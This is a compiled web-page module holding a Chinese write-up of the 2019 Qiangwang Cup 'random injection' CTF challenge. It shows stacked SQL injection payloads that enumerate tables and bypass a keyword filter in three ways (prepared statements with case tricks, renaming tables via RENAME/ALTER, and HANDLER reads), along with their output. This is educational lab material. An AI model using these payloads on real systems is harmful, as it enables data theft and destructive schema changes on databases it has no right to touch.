import{_ as a,r as e,o as t,c as p,a as n,b as o,d as i,e as l}from"./app-d4f08b22.js";const c={},d=l(`<p>#SQL 注入 #堆叠注入</p><hr><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>?inject=1&#39; or 1=1%23
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>回显，存在注入点 存在过滤</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>尝试堆叠注入</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>?inject=1&#39;; show databases;#
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>无报错</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>?inject=1&#39;; show tables;#

array(1) {
  [0]=&gt;
  string(16) &quot;1919810931114514&quot;
}

array(1) {
  [0]=&gt;
  string(5) &quot;words&quot;
}
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>继续查看表</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>?inject=1&#39;; show columns from \`1919810931114514\`;#

array(6) {
  [0]=&gt;
  string(4) &quot;flag&quot;
  [1]=&gt;
  string(12) &quot;varchar(100)&quot;
  [2]=&gt;
  string(2) &quot;NO&quot;
  [3]=&gt;
  string(0) &quot;&quot;
  [4]=&gt;
  NULL
  [5]=&gt;
  string(0) &quot;&quot;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>?inject=1&#39;; show columns from \`words\`;#

array(6) {
  [0]=&gt;
  string(2) &quot;id&quot;
  [1]=&gt;
  string(7) &quot;int(10)&quot;
  [2]=&gt;
  string(2) &quot;NO&quot;
  [3]=&gt;
  string(0) &quot;&quot;
  [4]=&gt;
  NULL
  [5]=&gt;
  string(0) &quot;&quot;
}

array(6) {
  [0]=&gt;
  string(4) &quot;data&quot;
  [1]=&gt;
  string(11) &quot;varchar(20)&quot;
  [2]=&gt;
  string(2) &quot;NO&quot;
  [3]=&gt;
  string(0) &quot;&quot;
  [4]=&gt;
  NULL
  [5]=&gt;
  string(0) &quot;&quot;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>关于在这里使用 反引号 而不是 &#39; 的一些解释： 两者在 linux 下和 windows 下不同，linux 下不区分，windows 下区分。 单引号 &#39;&#39; 或双引号主要用于 字符串的引用符号 反勾号 数据库、表、索引、列和别名用的是引用符是反勾号 (注：Esc 下面的键) 有 MYSQL 保留字作为字段的，必须加上反引号来区分！！！ 如果是数值，请不要使用引号。</p><p>原题目查询的数据表为 <code>words</code> 。既然没过滤 <code>alert</code> 和 <code>rename</code>，那就可以把表和列改名。先把 <code>words</code> 改为其他，再把<code>1919810931114514</code>改为 <code>words</code>，然后把新的 <code>words</code> 表里的 <code>flag</code> 列改为 <code>id</code> ，这样就可以直接查询 flag 了</p><h2 id="方法一-绕过-select" tabindex="-1"><a class="header-anchor" href="#方法一-绕过-select" aria-hidden="true">#</a> 方法一：绕过 select</h2><p>如果无法使用 select，还是获得不了 flag，可以通过预编译的方式绕过对 select 的限制。</p><p>SQL 语句的执行处理</p><ol><li>即时 SQL<br> 　一条 SQL 在 DB 接收到最终执行完毕返回，大致的过程如下： 　 1. 词法和语义解析；<br> 　 2. 优化 SQL 语句，制定执行计划；<br> 　 3. 执行并返回结果；<br> 如上，一条 SQL 直接是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL）。</li></ol><p>2、预处理 SQL<br> 但是，绝大多数情况下，某需求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。</p><p>所谓预编译语句就是将此类 SQL 语句中的值用占位符替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫 Prepared Statements。</p><p>预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。</p><p>预处理流程</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">SET</span><span class="token punctuation">;</span>									<span class="token comment"># 用于设置变量名和值</span>
<span class="token keyword">PREPARE</span> stmt_name <span class="token keyword">FROM</span> preparable_stmt<span class="token punctuation">;</span>	<span class="token comment"># 用于预备一个语句，并赋予名称，以后可以引用该语句</span>
<span class="token keyword">EXECUTE</span> stmt_name<span class="token punctuation">;</span>			 			<span class="token comment"># 执行语句</span>
{<span class="token keyword">DEALLOCATE</span> <span class="token operator">|</span> <span class="token keyword">DROP</span>} <span class="token keyword">PREPARE</span> stmt_name<span class="token punctuation">;</span>	<span class="token comment"># 用来释放掉预处理的语句</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>构建 payload:</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token operator">-</span><span class="token number">1</span><span class="token string">&#39;;
set @sql=CONCAT(&#39;</span>se<span class="token string">&#39;,&#39;</span>lect <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token identifier"><span class="token punctuation">\`</span>1919810931114514<span class="token punctuation">\`</span></span><span class="token punctuation">;</span>&#39;<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">prepare</span> stmt <span class="token keyword">from</span> <span class="token variable">@sql</span><span class="token punctuation">;</span>
<span class="token keyword">execute</span> stmt<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token punctuation">[</span><span class="token constant">OUTPUT</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$inject</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;set&quot;</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$inject</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;prepare&quot;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>暗示 <code>set</code> 与 <code>prepare</code> 关键词被拦截，但是 <code>strstr</code> 函数对大小写敏感，尝试使用大写绕过：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=&gt;</span>
  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">&quot;flag{c168d583ed0d4d7196967b28cbd0b5e9}&quot;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>获得 flag</p><h2 id="方法二-修改表名" tabindex="-1"><a class="header-anchor" href="#方法二-修改表名" aria-hidden="true">#</a> 方法二： 修改表名</h2><p>原题目查询的数据表为 <code>words</code> 。既然没过滤 <code>alert</code> 和 <code>rename</code>，那就可以把表和列改名。先把 <code>words</code> 改为其他，再把 <code>1919810931114514</code> 改为 <code>words</code>，然后把新的 <code>words</code> 表里的 <code>flag</code> 列改为 <code>id</code> ，这样就可以直接查询 flag 了</p><p>payload 如下：</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token operator">-</span><span class="token number">1</span>&#39;<span class="token punctuation">;</span>
<span class="token keyword">rename</span> <span class="token keyword">table</span> <span class="token identifier"><span class="token punctuation">\`</span>words<span class="token punctuation">\`</span></span> <span class="token keyword">to</span> <span class="token identifier"><span class="token punctuation">\`</span>test<span class="token punctuation">\`</span></span><span class="token punctuation">;</span>
<span class="token keyword">rename</span> <span class="token keyword">table</span> <span class="token identifier"><span class="token punctuation">\`</span>1919810931114514<span class="token punctuation">\`</span></span> <span class="token keyword">to</span> <span class="token identifier"><span class="token punctuation">\`</span>words<span class="token punctuation">\`</span></span><span class="token punctuation">;</span>
<span class="token keyword">alter</span> <span class="token keyword">table</span> <span class="token identifier"><span class="token punctuation">\`</span>words<span class="token punctuation">\`</span></span> change <span class="token identifier"><span class="token punctuation">\`</span>flag<span class="token punctuation">\`</span></span> <span class="token identifier"><span class="token punctuation">\`</span>id<span class="token punctuation">\`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> words<span class="token punctuation">;</span><span class="token comment">--+</span>
<span class="token comment"># ALTER TABLE tiger (表名) CHANGE tigername(要修改的列) name (修改后的列名) VARCHAR(20)(类型);</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用 <code>/?inject=1&#39; or 1=&#39;1</code> 访问一下即可获得 flag</p><h2 id="方法三-handler" tabindex="-1"><a class="header-anchor" href="#方法三-handler" aria-hidden="true">#</a> 方法三： handler</h2><p>mysql 除可使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过 handler 语句并不具备 select 语句的所有功能。它是 mysql 专用的语句，并没有包含到 SQL 标准中。</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">OPEN</span> <span class="token punctuation">[</span> <span class="token punctuation">[</span><span class="token keyword">AS</span><span class="token punctuation">]</span> alias<span class="token punctuation">]</span>
<span class="token comment"># 打开一张表，无返回结果，实际上声明了一个名为tb1_name的句柄。</span>
<span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">READ</span> index_name { <span class="token operator">=</span> <span class="token operator">|</span> <span class="token operator">&lt;=</span> <span class="token operator">|</span> <span class="token operator">&gt;=</span> <span class="token operator">|</span> <span class="token operator">&lt;</span> <span class="token operator">|</span> <span class="token operator">&gt;</span> } <span class="token punctuation">(</span>value1<span class="token punctuation">,</span>value2<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
    <span class="token punctuation">[</span> <span class="token keyword">WHERE</span> where_condition <span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span>
<span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">READ</span> index_name { <span class="token keyword">FIRST</span> <span class="token operator">|</span> <span class="token keyword">NEXT</span> <span class="token operator">|</span> <span class="token keyword">PREV</span> <span class="token operator">|</span> <span class="token keyword">LAST</span> }
    <span class="token punctuation">[</span> <span class="token keyword">WHERE</span> where_condition <span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span>
<span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">READ</span> { <span class="token keyword">FIRST</span> <span class="token operator">|</span> <span class="token keyword">NEXT</span> }
    <span class="token punctuation">[</span> <span class="token keyword">WHERE</span> where_condition <span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span>
<span class="token comment"># 获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</span>
<span class="token keyword">HANDLER</span> tbl_name <span class="token keyword">CLOSE</span>
<span class="token comment"># 关闭打开的句柄。</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用 payload：</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token number">1</span>&#39;<span class="token punctuation">;</span>
<span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">\`</span>1919810931114514<span class="token punctuation">\`</span></span> <span class="token keyword">open</span><span class="token punctuation">;</span>
<span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">\`</span>1919810931114514<span class="token punctuation">\`</span></span> <span class="token keyword">read</span> <span class="token keyword">first</span><span class="token punctuation">;</span><span class="token comment">-- +</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="最后" tabindex="-1"><a class="header-anchor" href="#最后" aria-hidden="true">#</a> 最后</h1><p>原题目因为使用<code>multi_query()</code>执行一条或多条<code>sql</code>语句，然后将结果全部输出，才会出现这种漏洞。</p><p>MySQL 中反引号和单引号的区别与用法</p><ol><li>MySql 中用一对反引号来标注 SQL 语句中的标识，如<strong>数据库名、表名、字段名</strong>等</li><li>引号则用来标注语句中所引用的字符型常量或日期/时间型常量，即<strong>字段值</strong><br> 例如：</li></ol><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token identifier"><span class="token punctuation">\`</span>username<span class="token punctuation">\`</span></span> <span class="token keyword">where</span> <span class="token identifier"><span class="token punctuation">\`</span>name<span class="token punctuation">\`</span></span><span class="token operator">=</span><span class="token string">&quot;peri0d&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,44),r={href:"https://www.cnblogs.com/chalan630/p/12583667.html",target:"_blank",rel:"noopener noreferrer"};function u(k,v){const s=e("ExternalLinkIcon");return t(),p("div",null,[d,n("p",null,[n("a",r,[o("[强网杯 2019]随便注 - chalan630 - 博客园 (cnblogs.com)"),i(s)])])])}const b=a(c,[["render",u],["__file","随便注.html.vue"]]);export{b as default};
